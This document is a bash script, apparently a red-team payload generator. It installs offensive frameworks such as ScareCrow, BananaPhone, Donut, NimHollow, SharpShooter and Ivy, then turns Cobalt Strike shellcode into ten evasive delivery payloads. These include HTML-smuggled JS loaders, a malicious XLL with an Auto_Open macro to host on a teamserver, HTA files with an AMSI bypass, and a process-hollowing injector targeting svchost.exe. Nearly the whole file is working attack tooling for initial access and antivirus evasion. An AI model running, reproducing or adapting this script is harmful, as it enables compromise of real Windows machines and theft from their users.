#!/bin/bash
payload_dir=$( echo $(pwd)/payloads )
payload64=payload64.bin
payload64stageless=payload64stageless.bin
payload32=payload32.bin
payload32stageless=payload32stageless.bin
payload32sharp=payload32.cs
payload64sharp=payload64.cs

#This Script Creates the Following 10 Payloads
#ScareCrow JS File using wscript loader(Stageless)
#ScareCrow JS File using Excel Loader(Stageless)
#ScareCrow JS File using MSIExec Loader(Stageless)
#Scarecrow XLL to be used with Office Macro. Macro gets outputted to dent.macro, https-scarecrow.xll to be uploaded to teamserver (Stageless)
#Bananphone Payload(Staged)
#Bananaphone Payload Generated with ScareCrow & Donut(Stageless)
#AMSI bypass sharpshooter hta(Staged)
#Cactus Torch (Staged Payload)
#NimHollow (Stageless payload)
#Ivy Macro (Stageless payload

#Run the script and generate the following inside of the created payload directory
#64 bit Raw staged payload named payload64.bin
#64 bit Raw unstaged payload named payload64stageless.bin
#32 bit Raw staged payload named payload32.bin
#32 bit Raw unstaged payload32stageless.bin
#32 bit C sharp payload called payload32.cs
#64 bit C sharp payload called payload64.cs


echo "[+] Creating Payload Directory @ $payload_dir"
mkdir $payload_dir
echo "[+] Please generate a 64 bit RAW CS payload within $payload_dir and name it payload64.bin"
echo "[+] Please generate a 64 bit RAW Stageless CS payload within $payload_dir and name it payload64stageless.bin"
echo "[+] Please generate a 32 bit RAW CS payload within $payload_dir and name it payload32.bin"
echo "[+] Please generate a 32 bit RAW CS stageless payload within $payload_dir and name it payload32stageless.bin"
echo "[+] Please generate a 64 bit C# CS payload within $payload_dir and name it payload64.cs"
echo "[+] Please generate a 32 bit C# CS payload within $payload_dir and name it payload32.cs"
echo ".. press any key to continue once finished."
read cont

#Payload Check
if test -f "$payload_dir/$payload64"; then
	echo "[+] 64 bit RAW Found"
else
	echo "[X] Please generate a 64 bit RAW CS payload within $payload_dir and name it payload64.bin"
	exit
fi
if test -f "$payload_dir/$payload64stageless"; then
	echo "[+] 64 bit RAW Stageless Found"
else
	echo "[X] Please generate a 64 bit RAW Stageless CS payload within $payload_dir and name it payload64stageless.bin"
	exit
fi
if test -f "$payload_dir/$payload32"; then
	echo "[+] 32 bit RAW Found"
else
	echo "[X] Please generate a 32 bit RAW CS payload within $payload_dir and name it payload32.bin"
	exit
fi
if test -f "$payload_dir/$payload32stageless"; then
	echo "[+] 64 bit RAW Found"
else
	echo "[X] Please generate a 32 bit RAW CS stageless payload within $payload_dir and name it payload32stageless.bin"
	exit
fi
if test -f "$payload_dir/$payload64sharp"; then
	echo "[+] 64 bit csharp payload Found"
else
	echo "[X] Please generate a 64 bit C# CS payload within $payload_dir and name it payload64.cs"
	exit
fi
if test -f "$payload_dir/$payload32sharp"; then
	echo "[+] 32 bit csharp payload Found"
else
	echo "[X] Please generate a 32 bit C# CS payload within $payload_dir and name it payload32.cs"
	exit
fi
#Tool Check


#check for Ivy
if [[ -d "/tools/Ivy" ]]
	then
		echo "[+] Ivy payload creation framework ... check"
	else
		echo "[+] Ivy payload creation framework ... attempting to install"
		cd /tools && git clone https://github.com/optiv/Ivy.git && cd Ivy
		go get github.com/fatih/color
		go get github.com/KyleBanks/XOREncryption/Go
		go build Ivy.go
		
	fi


# Check for Nim
if [[ -d "/etc/nim" ]]
	then
		echo "[+] Nimble ... check"
	else
		echo "[+] No Nim installation ... attempting to install"
		apt install nim	
	fi
# Check for NimHollow
if [[ -d "/tools/NimHollow" ]]
	then
		echo "[+] NimHollow ... check"
	else
		echo "[+] No NimHallow installation ... attempting to install"
		cd /tools && git clone --recurse-submodules https://github.com/snovvcrash/NimHollow && cd NimHollow
		nimble install winim nimcrypto
		pip3 install -r requirements.txt
		sudo apt install upx -y
	fi

# Check for Dent
if [[ -d "/tools/Dent" ]]
	then
		echo "[+] Dent... check"
	else
		echo "[+] No Dent ... attempting to install"
		cd /tools && git clone https://github.com/optiv/Dent.git
		cd /tools/Dent && go build Dent.go
		
	fi
	
# Check for ShikataGaNai
if  [[ -d "/tools/sgn" ]]
	then
		echo "[+] ShikataGaNai ... check!"
	else
		echo "[+] No ShikataGaNai ... attempting to install"
		cd /tools && git clone https://github.com/EgeBalci/sgn.git
	fi
#Check For wclang	
if [[ -d "/tools/wclang" ]]
	then
		echo "[+] wclang ... check!"
	else
		echo "[+] No wclang ... attempting to install"
		cd /tools && git clone https://github.com/tpoechtrager/wclang.git
	fi
# Check for ScareCrow
if [[ -d "/tools/ScareCrow" ]]
	then
		echo "[+] ScareCrow ... check!"
	else
		echo "[+] No ScareCrow ... attempting to install"
		go get github.com/fatih/color
		go get github.com/yeka/zip
		go get github.com/josephspurrier/goversioninfo
		cd /tools && git clone https://github.com/optiv/ScareCrow.git
		cd /tools/ScareCrow && go build ScareCrow.go
	fi
#Check for Donut
if [[ -d "/tools/BananaPhone" ]]
	then
		if test -f "/tools/donut/donut"; then
				echo "[*] Donut .. check "
			
			else
				echo "[+] donut directory found but binary not made, attempting to make"
				cd /tools/donut && make
			fi
	else
	echo "[+] No donut found ... attempting to install"
	cd /tools && git clone https://github.com/TheWover/donut.git
	
	fi
# Check For BananaPhone
if [[ -d "/tools/BananaPhone" ]]
	then
		echo "[+] BananaPhone... check!"
	else
		echo "[+] No BananaPhone ... attempting to install"
		cd /tools/ && git clone https://github.com/C-Sto/BananaPhone.git
	fi
# Check for EmbedInHTML
if [[ -d "/tools/EmbedInHTML" ]]
	then
		echo "[+] EmbedInHTML ... check!"
	else
		echo "[+] No EmbedInHTML ... attempting to install"
		cd /tools/ && git clone https://github.com/Arno0x/EmbedInHTML.git
	fi


echo "[+] Please Enter The Name Of Domain Being Used for Assessment (e.g google.com)"
read domain
echo "[+] Please enter url of domain being used for Assessment (e.g https://google.com)"
read url
       #Create ScareCrow Payloads
       echo "[+] $payload64stageless found, Generating ScaryWscript ScaryExcel and ScaryMSIEXEC"
       /tools/ScareCrow/ScareCrow -I $payload_dir/$payload64stageless  -Loader wscript -url $url -domain $domain -O $payload_dir/01-scarywscript.js	
       /tools/ScareCrow/ScareCrow -I $payload_dir/$payload64stageless -Loader excel -url $url -domain $domain -O $payload_dir/02-scaryexcel.js 
       /tools/ScareCrow/ScareCrow -I $payload_dir/$payload64stageless  -Loader msiexec -url $url -domain $domain -O $payload_dir/03-scarymsiexec.js
       
       #Wrap JS Payloads
       cd /tools/EmbedInHTML/ && python2 embedInHTML.py -k supersecretpass123 -f $payload_dir/01-scarywscript.js -o 01-scarywscript.html
       cd /tools/EmbedInHTML/ && python2 embedInHTML.py -k supersecretpass123 -f $payload_dir/02-scaryexcel.js -o 02-scaryexcel.html
       cd /tools/EmbedInHTML/ && python2 embedInHTML.py -k supersecretpass123 -f $payload_dir/03-scarymsiexec.js -o 03-scarymsiexec.html
       cp /tools/EmbedInHTML/output/* $payload_dir
       cd $payload_dir
       
       #create DENT payload
	/tools/ScareCrow/ScareCrow -I $payload_dir/$payload64stageless -domain $domain -Loader excel -O $payload_dir/scarecrow-output.xll 
	#sed '1,13d' $payload_dir/scarecrow-output.xll | tac | sed '1,26d' | tac | cut -d ""\" -f 2| tr -d "\n" > $payload_dir/https-scarecrow.xll #uncomment this line if using a freshly downloaded copy Scarecrow
	sed -n 13,14p ./scarecrow-output.xll | cut -d "'" -f 2| tr -d '\n' > https-scarecrow.xll
	echo "[+] Malicious XLL created at $payload_dir/https-scarecrow.xll. Host this file on Cobalt Strike Team Server"
	/tools/Dent/Dent -N cisadent.xll -U $url/ -F https-scarecrow.xll
	mv $payload_dir/output.txt $payload_dir/dent.macro
	echo "[+] Dent macro located at $payload_dir/dent.macro! Copy this macro into your office payload of choice. Rename the Function to Auto_Open"
	cd $payload_dir
	
       #Create BananPhone
       if test -f "/tools/BananaPhone/example/hideexample/nobanana/main.go.bak";then
       cp /tools/BananaPhone/example/hideexample/nobanana/main.go.bak /tools/BananaPhone/example/hideexample/nobanana/main.go
       fi
       echo "[+] $payload64stageless  found ... Generating Generating Shellcode for BananPhone Payload"
       cp /tools/BananaPhone/example/hideexample/nobanana/main.go /tools/BananaPhone/example/hideexample/nobanana/main.go.bak
       echo "copying Payload64.cs shellcode into bananaphone Template"
       sed -i '7,24d' /tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i "7r$payload_dir/payload64.cs" /tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i '8d' /tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i "8i\\var shellcode = []byte{" /tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i 's/byte\[\].*\] {//g' /tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i 's/ };/,}\n/g' /tools/BananaPhone/example/hideexample/nobanana/main.go
       echo "Copy Complete, Generating BananaPhone Payload"
       cd /tools/BananaPhone/example/hideexample/nobanana && GOOS=windows ARCH=amd64 go build -ldflags -H=windowsgui
       cp /tools/BananaPhone/example/hideexample/nobanana/nobanana.exe $payload_dir/04-banana.exe
       cd $payload_dir
       
       #Create ScaryBananaDonut
       if test -f "/tools/BananaPhone/example/hideexample/nobanana/main.go.bak";then
       cp /tools/BananaPhone/example/hideexample/nobanana/main.go.bak /tools/BananaPhone/example/hideexample/nobanana/main.go
       fi
       echo "[+] $payload64stageless  found ... Generating Generating Shellcode for ScaryBananaDonut"
       cp /tools/BananaPhone/example/hideexample/nobanana/main.go /tools/BananaPhone/example/hideexample/nobanana/main.go.bak
       /tools/ScareCrow/ScareCrow -I $payload_dir/$payload64stageless -Loader binary -domain $domain 
       echo "[+] Enter the name of the above generated Scary payload (E.g Onenote.exe Excel.exe Lync.exe etc)"
       read scary_payload
       if test -f "/tools/donut";then
       /tools/donut/donut -a 2 -f 7 -o $payload_dir/donut_payload.bin $scary_payload
       else
       echo "[+] Donut binary not found, making binary"
       cd /tools/donut && make
       cd $payload_dir
       /tools/donut/donut -a 2 -f 7 -o $payload_dir/donut_payload.bin $scary_payload
       fi
       echo "Donut complete, copying donut_payload.bin shellcode into bananaphone Template"
       sed -i '7,24d' /tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i "7r$payload_dir/donut_payload.bin" /tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i '8d' /tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i "8i\\var shellcode = []byte{" /tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i 's/0x00};/0x00, }\n/g' /tools/BananaPhone/example/hideexample/nobanana/main.go
       echo "Copy Complete, Generating BananaPhone Payload"
       cd /tools/BananaPhone/example/hideexample/nobanana && GOOS=windows ARCH=amd64 go build -ldflags -H=windowsgui
       cp /tools/BananaPhone/example/hideexample/nobanana/nobanana.exe $payload_dir/05-bananascarydonut.exe
       echo "05-bananascarydonut.exe completed"	 
      
       
       #Create SharpShooter
       cp $payload_dir/$payload32sharp $payload_dir/payload32_sharpshooter.cs
       sed -i '1d' $payload_dir/payload32_sharpshooter.cs
       sed -i 's/.*{//' $payload_dir/payload32_sharpshooter.cs
       sed -i 's/};//' $payload_dir/payload32_sharpshooter.cs

      
       
       
       cd /tools/SharpShooter; python3 SharpShooter.py --dotnetver 2 --delivery web --payload hta --shellcode --scfile $payload_dir/payload32_sharpshooter.cs --smuggle --template sharepoint --web https://$domain/06-https-sharp.payload --output 06-https-sharp
              echo "[*] 06-Sharpshooter.hta Complete"

       
       
       
       #Create SharpShooter AMSI bypass
       python3 /tools/SharpShooter/SharpShooter.py --stageless --dotnetver 4 --payload hta --output 07-SharpShooterAmsiBypass --rawscfile $payload_dir/$payload32stageless --smuggle --template mcafee --amsi amsienable
       
       cp /tools/SharpShooter/output/* $payload_dir/
       echo "[*] 07-SharpShooterAmsiBypass.hta Complete"
       
       #Create CACTUSTORCH HTA
       cactus=$(cat $payload_dir/$payload32 | base64 -w 0) 
       sed -i "29d" /tools/CACTUSTORCH/CACTUSTORCH.hta
       sed -i "29iDim code : code = \"$cactus\"" /tools/CACTUSTORCH/CACTUSTORCH.hta
       cp /tools/CACTUSTORCH/CACTUSTORCH.hta $payload_dir/08-cactus.hta
       echo "[*] 08-CACTUSTORCH.hta Complete"

       #Create NimHollow Payload
       cd /tools/NimHollow && python3 NimHollow.py   $payload_dir/$payload64stageless -i 'C:\Windows\System32\svchost.exe' -o injector --upx --rm
       cp injector.exe  $payload_dir/09-nimhollow.exe
       echo "[*] 09-CACTUSTORCH.hta Complete"

       #Create 64bit Ivy macro Payload
	cd /tools/Ivy && /tools/Ivy/Ivy -Ix64 $payload_dir/$payload64stageless -delivery macro -P Local -O ivy.payload -stageless -url $url > $payload_dir/ivy.macro
	echo "[*] 10-Ivy Macro Complete. Copy contents of ivy.macro from the payload directory to an office document and upload ivy.payload to the teamserver."
	
